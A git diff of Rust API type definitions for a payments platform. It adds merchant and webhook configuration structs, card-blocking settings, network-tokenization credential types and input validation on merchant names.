@@ -10,19 +10,18 @@ use common_utils::{
 };
 #[cfg(feature = "v1")]
 use common_utils::{crypto::OptionalEncryptableName, ext_traits::ValueExt};
-#[cfg(feature = "v2")]
-use masking::ExposeInterface;
-use masking::{PeekInterface, Secret};
+use hyperswitch_masking::{ExposeInterface, PeekInterface, Secret};
 use serde::{Deserialize, Serialize};
+use smithy::SmithyModel;
 use utoipa::ToSchema;
 
 use super::payments::AddressDetails;
+#[cfg(feature = "v1")]
+use crate::routing;
 use crate::{
     consts::{MAX_ORDER_FULFILLMENT_EXPIRY, MIN_ORDER_FULFILLMENT_EXPIRY},
-    enums as api_enums, payment_methods,
+    enums as api_enums, payment_methods, profile_acquirer,
 };
-#[cfg(feature = "v1")]
-use crate::{profile_acquirer::ProfileAcquirerResponse, routing};
 
 #[derive(Clone, Debug, Deserialize, ToSchema, Serialize)]
 pub struct MerchantAccountListRequest {
@@ -49,7 +48,7 @@ pub struct MerchantAccountCreate {
     pub return_url: Option<url::Url>,
 
     /// Webhook related details
-    pub webhook_details: Option<WebhookDetails>,
+    pub webhook_details: Option<WebhookDetailsRequest>,
 
     /// The routing algorithm to be used for routing payments to desired connectors
     #[serde(skip)]
@@ -114,12 +113,27 @@ pub struct MerchantAccountCreate {
     pub product_type: Option<api_enums::MerchantProductType>,
 
     /// Merchant Account Type of this merchant account
-    #[schema(value_type = Option<MerchantAccountRequestType>, example = "standard")]
-    pub merchant_account_type: Option<api_enums::MerchantAccountRequestType>,
+    #[schema(value_type = Option<MerchantAccountType>, example = "standard")]
+    pub merchant_account_type: Option<api_enums::MerchantAccountType>,
+
+    /// Network tokenization credentials for this merchant account
+    #[schema(value_type = Option<NetworkTokeizationProviderCredentials>)]
+    pub network_tokenization_credentials: Option<NetworkTokeizationProviderCredentials>,
 }
 
 #[cfg(feature = "v1")]
 impl MerchantAccountCreate {
+    pub fn validate(&self) -> Result<(), String> {
+        if let Some(ref merchant_name) = self.merchant_name {
+            if common_utils::validation::contains_potential_xss_or_sqli(merchant_name.peek()) {
+                return Err(
+                    "merchant_name contains potential XSS or SQLi attack vectors".to_string(),
+                );
+            }
+        }
+        Ok(())
+    }
+
     pub fn get_merchant_reference_id(&self) -> id_type::MerchantId {
         self.merchant_id.clone()
     }
@@ -204,6 +218,17 @@ pub struct MerchantAccountCreateWithoutOrgId {
     pub product_type: Option<api_enums::MerchantProductType>,
 }
 
+#[cfg(feature = "v2")]
+impl MerchantAccountCreateWithoutOrgId {
+    pub fn validate(&self) -> Result<(), String> {
+        let merchant_name_string = self.merchant_name.peek().clone().into_inner();
+        if common_utils::validation::contains_potential_xss_or_sqli(&merchant_name_string) {
+            return Err("merchant_name contains potential XSS or SQLi attack vectors".to_string());
+        }
+        Ok(())
+    }
+}
+
 // In v2 the struct used in the API is MerchantAccountCreateWithoutOrgId
 // The following struct is only used internally, so we can reuse the common
 // part of `create_merchant_account` without duplicating its code for v2
@@ -221,6 +246,14 @@ pub struct MerchantAccountCreate {
 
 #[cfg(feature = "v2")]
 impl MerchantAccountCreate {
+    pub fn validate(&self) -> Result<(), String> {
+        let merchant_name_string = self.merchant_name.peek().clone().into_inner();
+        if common_utils::validation::contains_potential_xss_or_sqli(&merchant_name_string) {
+            return Err("merchant_name contains potential XSS or SQLi attack vectors".to_string());
+        }
+        Ok(())
+    }
+
     pub fn get_merchant_reference_id(&self) -> id_type::MerchantId {
         id_type::MerchantId::from_merchant_name(self.merchant_name.clone().expose())
     }
@@ -266,6 +299,70 @@ pub struct CardTestingGuardConfig {
     pub customer_id_blocking_threshold: i32,
     /// Determines Redis Expiry for Card Testing Guard for profile
     pub card_testing_guard_expiry: i32,
+    /// Determines if Guest IP Blocking is enabled for profile
+    pub guest_ip_blocking_status: Option<CardTestingGuardStatus>,
+    /// Determines the unsuccessful payment threshold for Guest IP Blocking for profile
+    #[schema(default = 10)]
+    pub guest_ip_blocking_threshold: Option<i32>,
+}
+
+/// Configuration for payment method blocking based on card attributes
+#[derive(Clone, Debug, Deserialize, Serialize, ToSchema)]
+pub struct PaymentMethodBlockingConfig {
+    /// Card-specific blocking configuration
+    pub card: Option<CardBlockingConfig>,
+    /// Wallet-specific blocking configuration (applies to Apple Pay, Google Pay)
+    pub wallet: Option<WalletBlockingConfig>,
+}
+
+/// Card-specific blocking configuration
+#[derive(Clone, Debug, Deserialize, Serialize, ToSchema)]
+pub struct CardBlockingConfig {
+    /// Set of issuing countries to block using ISO 3166-1 alpha-2 codes (e.g., ["IN", "US"])
+    #[schema(value_type = Option<Vec<CountryAlpha2>>)]
+    pub issuing_country: Option<HashSet<common_enums::CountryAlpha2>>,
+    /// Set of card types to block (e.g., ["Credit", "Debit"])
+    #[schema(value_type = Option<Vec<CardType>>)]
+    pub card_types: Option<HashSet<common_enums::CardType>>,
+    /// Set of card subtypes to block
+    #[schema(value_type = Option<Vec<String>>)]
+    pub card_subtypes: Option<HashSet<String>>,
+    /// Set of card issuer IDs to block
+    pub issuers: Option<HashSet<String>>,
+    /// Whether to block if BIN is provided but no matching record found in cards_info table.
+    /// Defaults to false (allow payment if BIN not found in database).
+    pub block_if_bin_info_unavailable: Option<bool>,
+    /// Set of card networks to block
+    #[schema(value_type = Option<Vec<CardNetwork>>)]
+    pub card_networks: Option<HashSet<common_enums::CardNetwork>>,
+    /// Set of card funding sources to block
+    #[schema(value_type = Option<Vec<FundingSource>>)]
+    pub funding_sources: Option<HashSet<common_enums::FundingSource>>,
+    /// Set of card segment types to block
+    #[schema(value_type = Option<Vec<CardSegmentType>>)]
+    pub card_segment_types: Option<HashSet<common_enums::CardSegmentType>>,
+    /// Whether virtual cards should be blocked
+    pub block_virtual_cards: Option<bool>,
+    /// Whether non-reloadable prepaid cards should be blocked
+    pub block_non_reloadable_prepaid_cards: Option<bool>,
+    /// Whether cards from BINs marked for gambling should be blocked
+    pub gambling_blocked: Option<bool>,
+}
+
+/// Wallet-specific blocking configuration for Apple Pay and Google Pay
+#[derive(Clone, Debug, Deserialize, Serialize, ToSchema)]
+pub struct WalletBlockingConfig {
+    /// Set of card types to block for all wallet payments (e.g., ["Credit", "Debit"]).
+    ///
+    /// Deprecated: this applies one rule to every wallet, so a card type cannot be blocked on
+    /// Apple Pay without also blocking it on Google Pay. Use `apple_pay.card_types` and
+    /// `google_pay.card_types` instead, which are evaluated per wallet against that wallet's decrypted card.
+    #[schema(value_type = Option<Vec<CardType>>, deprecated)]
+    pub card_types: Option<HashSet<common_enums::CardType>>,
+    /// Apple Pay-specific blocking configuration
+    pub apple_pay: Option<CardBlockingConfig>,
+    /// Google Pay-specific blocking configuration
+    pub google_pay: Option<CardBlockingConfig>,
 }
 
 #[derive(Debug, Clone, serde::Deserialize, serde::Serialize, ToSchema)]
@@ -295,6 +392,23 @@ pub struct ExternalVaultConnectorDetails {
     /// External vault to be used for storing payment method information
     #[schema(value_type = Option<VaultSdk>)]
     pub vault_sdk: Option<common_enums::VaultSdk>,
+
+    /// Fields to tokenization in vault
+    pub vault_token_selector: Option<Vec<VaultTokenField>>,
+}
+
+#[derive(Clone, Debug, Deserialize, Serialize, ToSchema)]
+pub struct SurchargeConnectorDetails {
+    /// The surcharge connector ID for calculating external surcharge
+    #[schema(value_type = Option<String>)]
+    pub surcharge_connector_id: Option<id_type::MerchantConnectorAccountId>,
+}
+
+#[derive(Clone, Debug, Deserialize, Serialize, ToSchema)]
+pub struct VaultTokenField {
+    /// Type of field to be tokenized in
+    #[schema(value_type = Option<VaultTokenType>)]
+    pub token_type: common_enums::VaultTokenType,
 }
 
 #[derive(Clone, Debug, Deserialize, Serialize, ToSchema)]
@@ -303,6 +417,17 @@ pub struct MerchantAccountMetadata {
 
     #[serde(flatten)]
     pub data: Option<pii::SecretSerdeValue>,
+}
+
+/// Merchant-level Offer Engine credentials (Offer Engine issues one account per merchant)
+#[derive(Clone, Debug, Deserialize, ToSchema, Serialize)]
+pub struct OfferEngineMerchantConfig {
+    /// API key issued by Offer Engine for this merchant
+    #[schema(value_type = String)]
+    pub api_key: Secret<String>,
+
+    /// The Offer Engine merchant id sent in Offer Engine request bodies
+    pub merchant_id: String,
 }
 
 #[cfg(feature = "v1")]
@@ -325,7 +450,7 @@ pub struct MerchantAccountUpdate {
     pub return_url: Option<url::Url>,
 
     /// Webhook related details
-    pub webhook_details: Option<WebhookDetails>,
+    pub webhook_details: Option<WebhookDetailsRequest>,
 
     /// The routing algorithm to be used for routing payments to desired connectors
     #[serde(skip)]
@@ -382,10 +507,29 @@ pub struct MerchantAccountUpdate {
     /// Default payment method collect link config
     #[schema(value_type = Option<BusinessCollectLinkConfig>)]
     pub pm_collect_link_config: Option<BusinessCollectLinkConfig>,
+
+    /// Network tokenization credentials for this merchant account
+    #[schema(value_type = Option<NetworkTokeizationProviderCredentials>)]
+    pub network_tokenization_credentials: Option<NetworkTokeizationProviderCredentials>,
+
+    /// Merchant-level Offer Engine credentials, used when the resolved credential source is `merchant`
+    #[schema(value_type = Option<OfferEngineMerchantConfig>)]
+    pub offer_engine_config: Option<OfferEngineMerchantConfig>,
 }
 
 #[cfg(feature = "v1")]
 impl MerchantAccountUpdate {
+    pub fn validate(&self) -> Result<(), String> {
+        if let Some(ref merchant_name) = self.merchant_name {
+            if common_utils::validation::contains_potential_xss_or_sqli(merchant_name) {
+                return Err(
+                    "merchant_name contains potential XSS or SQLi attack vectors".to_string(),
+                );
+            }
+        }
+        Ok(())
+    }
+
     pub fn get_primary_details_as_value(
         &self,
     ) -> CustomResult<Option<serde_json::Value>, errors::ParsingError> {
@@ -467,6 +611,17 @@ pub struct MerchantAccountUpdate {
 
 #[cfg(feature = "v2")]
 impl MerchantAccountUpdate {
+    pub fn validate(&self) -> Result<(), String> {
+        if let Some(ref merchant_name) = self.merchant_name {
+            if common_utils::validation::contains_potential_xss_or_sqli(merchant_name) {
+                return Err(
+                    "merchant_name contains potential XSS or SQLi attack vectors".to_string(),
+                );
+            }
+        }
+        Ok(())
+    }
+
     pub fn get_merchant_details_as_secret(
         &self,
     ) -> CustomResult<Option<pii::SecretSerdeValue>, errors::ParsingError> {
@@ -518,7 +673,7 @@ pub struct MerchantAccountResponse {
     pub merchant_details: Option<Encryptable<pii::SecretSerdeValue>>,
 
     /// Webhook related details
-    pub webhook_details: Option<WebhookDetails>,
+    pub webhook_details: Option<WebhookDetailsResponse>,
 
     /// The routing algorithm to be used to process the incoming request from merchant to outgoing payment processor or payment method. The default is 'Custom'
     #[serde(skip)]
@@ -584,6 +739,10 @@ pub struct MerchantAccountResponse {
     /// Merchant Account Type of this merchant account
     #[schema(value_type = MerchantAccountType, example = "standard")]
     pub merchant_account_type: api_enums::MerchantAccountType,
+
+    /// Network tokenization credentials for this merchant account
+    #[schema(value_type = Option<NetworkTokeizationProviderCredentials>)]
+    pub network_tokenization_credentials: Option<NetworkTokeizationProviderCredentials>,
 }
 
 #[cfg(feature = "v2")]
@@ -666,6 +825,35 @@ pub struct MerchantDetails {
     #[schema(value_type = Option<String>, example = "123456789")]
     pub merchant_tax_registration_id: Option<Secret<String>>,
 }
+
+/// The credentials required for calling the network tokenization provider APIs
+#[derive(Clone, Debug, Deserialize, ToSchema, Serialize)]
+#[serde(deny_unknown_fields)]
+#[serde(rename_all = "snake_case")]
+pub enum NetworkTokeizationProviderCredentials {
+    InternalNetworkTokenService(InternalNetworkTokenizationCredentials),
+}
+
+#[derive(Clone, Debug, Deserialize, ToSchema, Serialize)]
+#[serde(deny_unknown_fields)]
+#[serde(rename_all = "snake_case")]
+pub struct InternalNetworkTokenizationCredentials {
+    /// The API key to contact the network tokenization provider
+    #[schema(value_type = String, max_length = 255, example = "MDRFRDU3Mzc1Q0Q0N2893727712QzQjJEQzlENTBCOg==")]
+    pub token_service_api_key: Secret<String>,
+
+    /// The public key to encrypt the card details before sending to the network tokenization provider
+    #[schema(value_type = String, max_length = 255, example = "-----BEGIN PUBLIC KEY-----\nsom8723hj1bajhgd123==\n-----END PUBLIC KEY-----")]
+    pub public_key: Secret<String>,
+
+    /// The private key to decrypt the tokenized card details received from the network tokenization provider
+    #[schema(value_type = String, max_length = 255, example = "-----BEGIN RSA PRIVATE KEY-----\n897238huhbsdbjh12==\n-----END RSA PRIVATE KEY-----")]
+    pub private_key: Secret<String>,
+
+    /// The key_id used in encryption
+    #[schema(value_type = String, max_length = 255, example = "key_1ac9895a6d85414897213gahdac838a8")]
+    pub key_id: Secret<String>,
+}
 #[derive(Clone, Debug, Deserialize, ToSchema, Serialize, PartialEq)]
 #[serde(deny_unknown_fields)]
 pub struct PrimaryBusinessDetails {
@@ -677,7 +865,65 @@ pub struct PrimaryBusinessDetails {
 
 #[derive(Clone, Debug, Deserialize, ToSchema, Serialize)]
 #[serde(deny_unknown_fields)]
-pub struct WebhookDetails {
+pub struct WebhookDetailsRequest {
+    ///The version for Webhook
+    #[schema(max_length = 255, max_length = 255, example = "1.0.2")]
+    pub webhook_version: Option<String>,
+
+    ///The user name for Webhook login
+    #[schema(max_length = 255, max_length = 255, example = "ekart_retail")]
+    pub webhook_username: Option<String>,
+
+    ///The password for Webhook login
+    #[schema(value_type = Option<String>, max_length = 255, example = "ekart@123")]
+    pub webhook_password: Option<Secret<String>>,
+
+    /// The HTTP or HTTPS webhook URL. DNS must resolve to public addresses. Must not be empty;
+    /// omit this field entirely to leave an existing stored webhook URL unchanged.
+    #[schema(value_type = Option<String>, min_length = 1, example = "https://www.ekart.com/webhooks")]
+    pub webhook_url: Option<Secret<common_utils::outbound_url::SafeOutboundUrl>>,
+
+    /// If this property is true, a webhook message is posted whenever a new payment is created
+    #[schema(example = true)]
+    pub payment_created_enabled: Option<bool>,
+
+    /// If this property is true, a webhook message is posted whenever a payment is successful
+    #[schema(example = true)]
+    pub payment_succeeded_enabled: Option<bool>,
+
+    /// If this property is true, a webhook message is posted whenever a payment fails
+    #[schema(example = true)]
+    pub payment_failed_enabled: Option<bool>,
+
+    /// List of payment statuses that triggers a webhook for payment intents
+    #[schema(value_type = Vec<IntentStatus>, example = json!(["succeeded", "failed", "partially_captured", "requires_merchant_action"]))]
+    pub payment_statuses_enabled: Option<HashSet<api_enums::IntentStatus>>,
+
+    /// List of refund statuses that triggers a webhook for refunds
+    #[schema(value_type = Vec<RefundStatus>, example = json!(["success", "failure"]))]
+    pub refund_statuses_enabled: Option<HashSet<api_enums::RefundStatus>>,
+
+    /// List of payout statuses that triggers a webhook for payouts
+    #[cfg(feature = "payouts")]
+    #[schema(value_type = Option<Vec<PayoutStatus>>, example = json!(["success", "failed"]))]
+    pub payout_statuses_enabled: Option<HashSet<api_enums::PayoutStatus>>,
+
+    /// List of dispute statuses that trigger outgoing webhooks for disputes
+    #[schema(value_type = Option<Vec<DisputeStatus>>, example = json!(["dispute_opened", "dispute_won"]))]
+    pub dispute_statuses_enabled: Option<HashSet<api_enums::DisputeStatus>>,
+
+    /// List of mandate statuses that trigger outgoing webhooks for mandates
+    #[schema(value_type = Option<Vec<MandateStatus>>, example = json!(["active", "inactive"]))]
+    pub mandate_statuses_enabled: Option<HashSet<api_enums::MandateStatus>>,
+
+    /// List of invoice statuses that trigger outgoing webhooks for subscriptions
+    #[schema(value_type = Option<Vec<InvoiceStatus>>, example = json!(["invoice_paid"]))]
+    pub invoice_statuses_enabled: Option<HashSet<api_enums::InvoiceStatus>>,
+}
+
+#[derive(Clone, Debug, Deserialize, ToSchema, Serialize)]
+#[serde(deny_unknown_fields)]
+pub struct WebhookDetailsResponse {
     ///The version for Webhook
     #[schema(max_length = 255, max_length = 255, example = "1.0.2")]
     pub webhook_version: Option<String>,
@@ -691,7 +937,7 @@ pub struct WebhookDetails {
     pub webhook_password: Option<Secret<String>>,
 
     ///The url for the webhook endpoint
-    #[schema(value_type = Option<String>, example = "www.ekart.com/webhooks")]
+    #[schema(value_type = Option<String>, example = "https://www.ekart.com/webhooks")]
     pub webhook_url: Option<Secret<String>>,
 
     /// If this property is true, a webhook message is posted whenever a new payment is created
@@ -708,34 +954,69 @@ pub struct WebhookDetails {
 
     /// List of payment statuses that triggers a webhook for payment intents
     #[schema(value_type = Vec<IntentStatus>, example = json!(["succeeded", "failed", "partially_captured", "requires_merchant_action"]))]
-    pub payment_statuses_enabled: Option<Vec<api_enums::IntentStatus>>,
+    pub payment_statuses_enabled: Option<HashSet<api_enums::IntentStatus>>,
 
     /// List of refund statuses that triggers a webhook for refunds
-    #[schema(value_type = Vec<IntentStatus>, example = json!(["success", "failure"]))]
-    pub refund_statuses_enabled: Option<Vec<api_enums::RefundStatus>>,
+    #[schema(value_type = Vec<RefundStatus>, example = json!(["success", "failure"]))]
+    pub refund_statuses_enabled: Option<HashSet<api_enums::RefundStatus>>,
 
     /// List of payout statuses that triggers a webhook for payouts
     #[cfg(feature = "payouts")]
     #[schema(value_type = Option<Vec<PayoutStatus>>, example = json!(["success", "failed"]))]
-    pub payout_statuses_enabled: Option<Vec<api_enums::PayoutStatus>>,
+    pub payout_statuses_enabled: Option<HashSet<api_enums::PayoutStatus>>,
+
+    /// List of dispute statuses that trigger outgoing webhooks for disputes
+    #[schema(value_type = Option<Vec<DisputeStatus>>, example = json!(["dispute_opened", "dispute_won"]))]
+    pub dispute_statuses_enabled: Option<HashSet<api_enums::DisputeStatus>>,
+
+    /// List of mandate statuses that trigger outgoing webhooks for mandates
+    #[schema(value_type = Option<Vec<MandateStatus>>, example = json!(["active", "inactive"]))]
+    pub mandate_statuses_enabled: Option<HashSet<api_enums::MandateStatus>>,
+
+    /// List of invoice statuses that trigger outgoing webhooks for subscriptions
+    #[schema(value_type = Option<Vec<InvoiceStatus>>, example = json!(["invoice_paid"]))]
+    pub invoice_statuses_enabled: Option<HashSet<api_enums::InvoiceStatus>>,
 }
 
-impl WebhookDetails {
-    fn validate_statuses<T>(statuses: &[T], status_type_name: &str) -> Result<(), String>
+impl From<WebhookDetailsRequest> for WebhookDetailsResponse {
+    fn from(item: WebhookDetailsRequest) -> Self {
+        Self {
+            webhook_version: item.webhook_version,
+            webhook_username: item.webhook_username,
+            webhook_password: item.webhook_password,
+            webhook_url: item
+                .webhook_url
+                .map(|url| Secret::new(url.expose().get_string_repr().to_owned())),
+            payment_created_enabled: item.payment_created_enabled,
+            payment_failed_enabled: item.payment_failed_enabled,
+            payment_succeeded_enabled: item.payment_succeeded_enabled,
+            payment_statuses_enabled: item.payment_statuses_enabled,
+            refund_statuses_enabled: item.refund_statuses_enabled,
+            #[cfg(feature = "payouts")]
+            payout_statuses_enabled: item.payout_statuses_enabled,
+            dispute_statuses_enabled: item.dispute_statuses_enabled,
+            mandate_statuses_enabled: item.mandate_statuses_enabled,
+            invoice_statuses_enabled: item.invoice_statuses_enabled,
+        }
+    }
+}
+
+impl WebhookDetailsRequest {
+    fn validate_statuses<T>(statuses: &HashSet<T>, status_type_name: &str) -> Result<(), String>
     where
-        T: strum::IntoEnumIterator + Copy + PartialEq + std::fmt::Debug,
+        T: strum::IntoEnumIterator + Copy + Eq + std::hash::Hash + std::fmt::Debug,
         T: Into<Option<api_enums::EventType>>,
     {
-        let valid_statuses: Vec<T> = T::iter().filter(|s| (*s).into().is_some()).collect();
+        let valid_statuses: HashSet<T> = T::iter().filter(|s| (*s).into().is_some()).collect();
 
-        for status in statuses {
-            if !valid_statuses.contains(status) {
-                return Err(format!(
+        statuses
+            .iter()
+            .find(|status| !valid_statuses.contains(status))
+            .map_or(Ok(()), |status| {
+                Err(format!(
                     "Invalid {status_type_name} webhook status provided: {status:?}"
-                ));
-            }
-        }
-        Ok(())
+                ))
+            })
     }
 
     pub fn validate(&self) -> Result<(), String> {
@@ -754,7 +1035,56 @@ impl WebhookDetails {
             }
         }
 
+        if let Some(dispute_statuses) = &self.dispute_statuses_enabled {
+            Self::validate_statuses(dispute_statuses, "dispute")?;
+        }
+
+        if let Some(mandate_statuses) = &self.mandate_statuses_enabled {
+            Self::validate_statuses(mandate_statuses, "mandate")?;
+        }
+
+        if let Some(invoice_statuses) = &self.invoice_statuses_enabled {
+            Self::validate_statuses(invoice_statuses, "invoice")?;
+        }
+
         Ok(())
+    }
+}
+
+impl WebhookDetailsResponse {
+    pub fn merge(self, other: Self) -> Self {
+        Self {
+            webhook_version: other.webhook_version.or(self.webhook_version),
+            webhook_username: other.webhook_username.or(self.webhook_username),
+            webhook_password: other.webhook_password.or(self.webhook_password),
+            webhook_url: other.webhook_url.or(self.webhook_url),
+            payment_created_enabled: other
+                .payment_created_enabled
+                .or(self.payment_created_enabled),
+            payment_succeeded_enabled: other
+                .payment_succeeded_enabled
+                .or(self.payment_succeeded_enabled),
+            payment_failed_enabled: other.payment_failed_enabled.or(self.payment_failed_enabled),
+            payment_statuses_enabled: other
+                .payment_statuses_enabled
+                .or(self.payment_statuses_enabled),
+            refund_statuses_enabled: other
+                .refund_statuses_enabled
+                .or(self.refund_statuses_enabled),
+            #[cfg(feature = "payouts")]
+            payout_statuses_enabled: other
+                .payout_statuses_enabled
+                .or(self.payout_statuses_enabled),
+            dispute_statuses_enabled: other
+                .dispute_statuses_enabled
+                .or(self.dispute_statuses_enabled),
+            mandate_statuses_enabled: other
+                .mandate_statuses_enabled
+                .or(self.mandate_statuses_enabled),
+            invoice_statuses_enabled: other
+                .invoice_statuses_enabled
+                .or(self.invoice_statuses_enabled),
+        }
     }
 }
 
@@ -970,14 +1300,15 @@ pub struct MerchantConnectorCreate {
     pub frm_configs: Option<Vec<FrmConfigs>>,
 
     /// The business country to which the connector account is attached. To be deprecated soon. Use the 'profile_id' instead
-    #[schema(value_type = Option<CountryAlpha2>, example = "US")]
+    #[schema(value_type = Option<CountryAlpha2>, example = "US", deprecated)]
     pub business_country: Option<api_enums::CountryAlpha2>,
 
     /// The business label to which the connector account is attached. To be deprecated soon. Use the 'profile_id' instead
+    #[schema(deprecated)]
     pub business_label: Option<String>,
 
     /// The business sublabel to which the connector account is attached. To be deprecated soon. Use the 'profile_id' instead
-    #[schema(example = "chase")]
+    #[schema(example = "chase", deprecated)]
     pub business_sub_label: Option<String>,
 
     /// Unique ID of the connector
@@ -1046,6 +1377,11 @@ pub struct RevenueRecoveryMetadata {
     /// Maximum number of `billing connector` retries before revenue recovery can start executing retries.
     #[schema(value_type = u16, example = "10")]
     pub billing_connector_retry_threshold: u16,
+    /// Number of cascading (static) retries an invoice may use under the hybrid static + adaptive
+    /// scheme.
+    #[serde(default)]
+    #[schema(value_type = u16, example = "5")]
+    pub max_hybrid_cascading_retry_count: u16,
     /// Billing account reference id is payment gateway id at billing connector end.
     /// Merchants need to provide a mapping between these merchant connector account and the corresponding account reference IDs for each `billing connector`.
     #[schema(value_type = u16, example = r#"{ "mca_vDSg5z6AxnisHq5dbJ6g": "stripe_123", "mca_vDSg5z6AumisHqh4x5m1": "adyen_123" }"#)]
@@ -1236,16 +1572,20 @@ pub struct MerchantConnectorInfo {
     pub connector_label: String,
     #[schema(value_type = String)]
     pub merchant_connector_id: id_type::MerchantConnectorAccountId,
+    #[schema(value_type = ConnectorType, example = "payment_processor")]
+    pub connector_type: api_enums::ConnectorType,
 }
 
 impl MerchantConnectorInfo {
     pub fn new(
         connector_label: String,
         merchant_connector_id: id_type::MerchantConnectorAccountId,
+        connector_type: api_enums::ConnectorType,
     ) -> Self {
         Self {
             connector_label,
             merchant_connector_id,
+            connector_type,
         }
     }
 }
@@ -1331,6 +1671,7 @@ impl MerchantConnectorResponse {
         MerchantConnectorInfo {
             connector_label: connector_label.to_string(),
             merchant_connector_id: self.id.clone(),
+            connector_type: self.connector_type,
         }
     }
 }
@@ -1420,15 +1761,15 @@ pub struct MerchantConnectorResponse {
     pub frm_configs: Option<Vec<FrmConfigs>>,
 
     /// The business country to which the connector account is attached. To be deprecated soon. Use the 'profile_id' instead
-    #[schema(value_type = Option<CountryAlpha2>, example = "US")]
+    #[schema(value_type = Option<CountryAlpha2>, example = "US", deprecated)]
     pub business_country: Option<api_enums::CountryAlpha2>,
 
     ///The business label to which the connector account is attached. To be deprecated soon. Use the 'profile_id' instead
-    #[schema(example = "travel")]
+    #[schema(example = "travel", deprecated)]
     pub business_label: Option<String>,
 
     /// The business sublabel to which the connector account is attached. To be deprecated soon. Use the 'profile_id' instead
-    #[schema(example = "chase")]
+    #[schema(example = "chase", deprecated)]
     pub business_sub_label: Option<String>,
 
     /// identifier for the verified domains of a particular connector account
@@ -1446,6 +1787,11 @@ pub struct MerchantConnectorResponse {
     /// The connector_wallets_details is used to store wallet details such as certificates and wallet credentials
     #[schema(value_type = Option<ConnectorWalletDetails>)]
     pub connector_wallets_details: Option<ConnectorWalletDetails>,
+
+    /// Details about the connector’s webhook configuration
+    #[schema(value_type = Option<WebhookSetupCapabilities>, deprecated)]
+    pub webhook_setup_capabilities:
+        Option<common_types::connector_webhook_configuration::WebhookSetupCapabilities>,
 }
 
 #[cfg(feature = "v1")]
@@ -1454,6 +1800,7 @@ impl MerchantConnectorResponse {
         MerchantConnectorInfo {
             connector_label: connector_label.to_string(),
             merchant_connector_id: self.merchant_connector_id.clone(),
+            connector_type: self.connector_type,
         }
     }
 }
@@ -1526,15 +1873,15 @@ pub struct MerchantConnectorListResponse {
     pub frm_configs: Option<Vec<FrmConfigs>>,
 
     /// The business country to which the connector account is attached. To be deprecated soon. Use the 'profile_id' instead
-    #[schema(value_type = Option<CountryAlpha2>, example = "US")]
+    #[schema(value_type = Option<CountryAlpha2>, example = "US", deprecated)]
     pub business_country: Option<api_enums::CountryAlpha2>,
 
     ///The business label to which the connector account is attached. To be deprecated soon. Use the 'profile_id' instead
-    #[schema(example = "travel")]
+    #[schema(example = "travel", deprecated)]
     pub business_label: Option<String>,
 
     /// The business sublabel to which the connector account is attached. To be deprecated soon. Use the 'profile_id' instead
-    #[schema(example = "chase")]
+    #[schema(example = "chase", deprecated)]
     pub business_sub_label: Option<String>,
 
     /// identifier for the verified domains of a particular connector account
@@ -1553,6 +1900,7 @@ impl MerchantConnectorListResponse {
         MerchantConnectorInfo {
             connector_label: connector_label.to_string(),
             merchant_connector_id: self.merchant_connector_id.clone(),
+            connector_type: self.connector_type,
         }
     }
     pub fn get_connector_name(&self) -> String {
@@ -1612,6 +1960,7 @@ impl MerchantConnectorListResponse {
         MerchantConnectorInfo {
             connector_label: connector_label.to_string(),
             merchant_connector_id: self.id.clone(),
+            connector_type: self.connector_type,
         }
     }
     pub fn get_connector_name(&self) -> common_enums::connector_enums::Connector {
@@ -1837,6 +2186,7 @@ pub struct FrmPaymentMethod {
     #[schema(value_type = PaymentMethod,example = "card")]
     pub payment_method: Option<common_enums::PaymentMethod>,
     ///payment method types(credit, debit) that can be used in the payment. This field is deprecated. It has not been removed to provide backward compatibility.
+    #[schema(deprecated)]
     pub payment_method_types: Option<Vec<FrmPaymentMethodType>>,
     ///frm flow type to be used, can be pre/post
     #[schema(value_type = Option<FrmPreferredFlowTypes>)]
@@ -2000,31 +2350,47 @@ pub struct ToggleAllKVResponse {
 }
 
 /// Merchant connector details used to make payments.
-#[derive(Debug, Clone, Default, Eq, PartialEq, serde::Deserialize, serde::Serialize, ToSchema)]
+#[derive(
+    Debug,
+    Clone,
+    Default,
+    Eq,
+    PartialEq,
+    serde::Deserialize,
+    serde::Serialize,
+    SmithyModel,
+    ToSchema,
+)]
+#[smithy(namespace = "com.hyperswitch.smithy.types")]
 pub struct MerchantConnectorDetailsWrap {
     /// Creds Identifier is to uniquely identify the credentials. Do not send any sensitive info, like encoded_data in this field. And do not send the string "null".
+    #[smithy(value_type = "String")]
     pub creds_identifier: String,
     /// Merchant connector details type type. Base64 Encode the credentials and send it in  this type and send as a string.
     #[schema(value_type = Option<MerchantConnectorDetails>, example = r#"{
-        "connector_account_details": {
+       "connector_account_details": {
             "auth_type": "HeaderKey",
-            "api_key":"sk_test_xxxxxexamplexxxxxx12345"
+            "api_key":"<stripe_test_secret_key>"
         },
         "metadata": {
             "user_defined_field_1": "sample_1",
             "user_defined_field_2": "sample_2",
         },
     }"#)]
+    #[smithy(value_type = "Option<MerchantConnectorDetails>")]
     pub encoded_data: Option<Secret<String>>,
 }
 
-#[derive(Debug, Clone, Deserialize, Serialize, ToSchema)]
+#[derive(Debug, Clone, Deserialize, Serialize, SmithyModel, ToSchema)]
+#[smithy(namespace = "com.hyperswitch.smithy.types")]
 pub struct MerchantConnectorDetails {
     /// Account details of the Connector. You can specify up to 50 keys, with key names up to 40 characters long and values up to 500 characters long. Useful for storing additional, structured information on an object.
     #[schema(value_type = Option<Object>,example = json!({ "auth_type": "HeaderKey","api_key": "Basic MyVerySecretApiKey" }))]
+    #[smithy(value_type = "Option<Object>")]
     pub connector_account_details: pii::SecretSerdeValue,
     /// Metadata is useful for storing additional, unstructured information on an object.
     #[schema(value_type = Option<Object>,max_length = 255,example = json!({ "city": "NY", "unit": "245" }))]
+    #[smithy(value_type = "Option<Object>")]
     pub metadata: Option<pii::SecretSerdeValue>,
 }
 
@@ -2052,7 +2418,7 @@ pub struct ProfileCreate {
     pub redirect_to_merchant_with_http_post: Option<bool>,
 
     /// Webhook related details
-    pub webhook_details: Option<WebhookDetails>,
+    pub webhook_details: Option<WebhookDetailsRequest>,
 
     /// Metadata is useful for storing additional, unstructured information on an object.
     #[schema(value_type = Option<Object>, example = r#"{ "city": "NY", "unit": "245" }"#)]
@@ -2200,9 +2566,40 @@ pub struct ProfileCreate {
     /// Indicates if manual retry for payment is enabled or not
     pub is_manual_retry_enabled: Option<bool>,
 
+    /// When `true`, a payment whose requested `capture_method` is not supported by the
+    /// connector chosen for it is processed with `automatic` capture instead of being rejected,
+    /// and the payment method list does not hide payment methods based on `capture_method`.
+    #[schema(example = true)]
+    pub auto_fallback_capture_method: Option<bool>,
+
     /// Bool indicating if overcapture  must be requested for all payments
     #[schema(value_type = Option<bool>)]
